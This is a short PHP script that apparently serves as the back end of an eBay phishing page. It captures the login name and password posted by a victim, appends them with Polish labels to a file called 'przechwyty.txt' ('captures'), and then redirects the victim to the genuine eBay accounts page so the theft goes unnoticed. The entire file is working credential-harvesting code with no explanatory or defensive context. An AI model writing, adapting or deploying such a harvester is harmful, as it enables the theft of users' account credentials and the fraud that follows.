<?php

file_put_contents("przechwyty.txt", "Ebay Login: " . $_POST['userid'] . " Hasło: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://accounts.ebay.com/acctxs/user');
exit();
?>
